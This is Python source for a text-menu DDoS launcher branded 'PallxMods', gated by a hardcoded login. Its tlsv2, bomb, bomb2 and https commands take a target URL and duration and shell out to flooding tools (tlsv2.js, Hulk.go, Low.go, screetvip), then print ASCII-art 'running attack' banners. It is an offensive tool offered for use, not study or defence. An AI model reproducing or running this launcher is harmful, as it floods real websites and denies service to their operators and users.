               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                   TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   LAYER-12 :\033[92m [ \033[1;37mBRUTAL\033[92m ]
\033[1;37m                   VIP      : \033[93m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				req = sin.split()[3]
				os.system(f'cd godzilla && node tlsv2.js {url} {time} {req} 6')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                               •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                   TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                   TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                   REQUEST   :\033[92m [ \033[1;37m{req} \033[92m]
\033[1;37m                   LAYER-7  :\033[92m [ \033[1;37mTLSV2\033[92m ]
\033[1;37m                   VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                   USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				method = sin.split()[3]
				os.system(f'cd resources && go run Hulk.go -site {url} -data {method}')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                                •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                METHOD   :\033[92m [ \033[1;37m{method} \033[92m]
\033[1;37m                LAYER-7  :\033[92m [ \033[1;37mBOMB2\033[92m ]
\033[1;37m                VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				method = sin.split()[3]
				os.system(f'cd resources && go run Low.go -site {url} -data {method}')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1:37m                             •|⚠️running attack|•
\033[94m          __________________________________________________________
\033[94m
\033[1;37m                TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                METHOD   :\033[92m [ \033[1;37m{method} \033[92m]
\033[1;37m                LAYER-7  :\033[92m [ \033[1;37mBOMB\033[92m ]
\033[1;37m                VIP      : \033[92m[ \033[32mTrue \033[92m]
\033[1;37m                USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m          __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd randomstring && ./screetvip {url} {time} 6 1')
				os.system ("clear")
				print(f"""\033[92m
               ;;;;;;;;;'',,.,lllc,.',,,'',;clllc,...'.c.. ,;;;;;;;
               kkkkkkloxKNKOkkOXN0KXKOkO00OkddddkNN0dl:ld'.,lkkkkkk
               kkkxcdKWXkok0XNWWWWWWWXKkOkONWWWNKkO000lco:..'.okkkk
               xo;dNWXdx0NWKWWWWWWWWWWWNO0KxkNWWWWWNXxoOl.',,,';dkk
               coXWNkkNWWW0KWWWWWWWWWWWWWXxXKoKWWWWWNk0Nd.o:...,::x
               0WNKkNWWWWWoWWWWWWWWWWWWNNWNoKNokNNNNNO0Ol,,;''c.l;.
               WNOOWWWWWWNlWWNNWWWWWWWNNNNNNcKNdxXNNNKOkolcllc:o.,,
               XO0WWWWWWWNlWWNXNNNNNNNNN0NNNXcXNoxXNNNXXXOOOkkxollc
               O0WWWWWWWWNlNNNXNNNNNNNNNKkNNNxdKX,cxO0XNXXOxNXOxc;;
               0WWWWNNNNNXkdNNNKNNNNNNNNNkONNN'oKXcookOXNXX0dXklk;.
               NNNNNNNXNXNlokKK00NNNXNNNNNx0NNcklxKlOxddkXNXKoKl,::
               NNNNNNXNXX0;xlxNNo0XNNXNNNNNxOXcOKkodldKXOxdxxx:llod
               NNNNNXXkKX,O00xdXXcdKXNXXNNNNkd:0NNNXOklcxOkkkOO,d'x
               NNNXKKdKXlx0NNX0dxKo:okKXKKXNNKd0NNk:'..        ,,',
               NXKKxdKKod0NNNNXXKkkdoxoodxOKXXN0kKOXOWK;c.......kNN
               KKxoOKKcd0NNNNOxoc:ck0k0NNX0kkOO00k0NKook0xxxxxxd'WW
               kdo0KkckK0o;.   ...:KNNNNNNNNNNNNNNNNNO000000000OO00                                     NKlkc:c;.'c:...;O;;;dNNNNNNNNNNNNNNNNNNNNNNXXXKKKKKk
               NN,::.,dKWNd.;lO0dkkONNNNNNNNNNNNNNNNNNNNNNNXXKOkkkX
               NNO.lKNWW0'xkkO00XNNNNNNNNNNNNONNNNNNNNNNNNNNXXKOkkk
               NNNx'OWWNKcO0XNNNNNNNNNNNNNNNokdxNNNNNNNNNNNNNNNNNNN
               XXNN0loKXXKXXXXNNNNNNNNNNNNNKKNNXNNNNNNNNNNNNNNNNNNN
               KKKXNN0xxxKXXXXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               0KK0KKKKKKkxkxdlxXNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
               lO0000xxOkdoodkNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNKkoc
               k.:d000OocldkkxNNNNNNNNNNNNNNNNNNNNNNNNNNNN0kdl;ldxc
\033[1;37m                             •|⚠️running attack|•
\033[94m           __________________________________________________________
\033[94m
\033[1;37m                TARGET   : \033[92m[ \033[1;37m{url}  \033[92m]
\033[1;37m                TIME     :\033[92m [\033[1;37m {time}\033[92m ]
\033[1;37m                METHOD   :\033[92m [ \033[1;37mHTTPS \033[92m]
\033[1;37m                VIP      :\033[92m [ \033[1;37mVIP\033[92m ]
\033[1;37m                USER     : \033[92m[ \033[1;37mAdmin\033[92m ]
\033[94m           __________________________________________________________
""")
			except ValueError:
				main()
			except IndexError:
			    main()
                

					
 
def login():
    os.system("clear")
    user = "coli"
    passwd = "vvip"
    username = input("""\033[92m


                                         
    
                
                          🐣 \33[0;32mLOGIN TO PallxMods : """)
    password = getpass.getpass(prompt="""                  
                            \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                               \033[1;31;40mBUY!!!""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                          \33[0;32mWELLCOME TO PallxMods""")
        time.sleep(0.3)
    menu()
    main()
    

login()
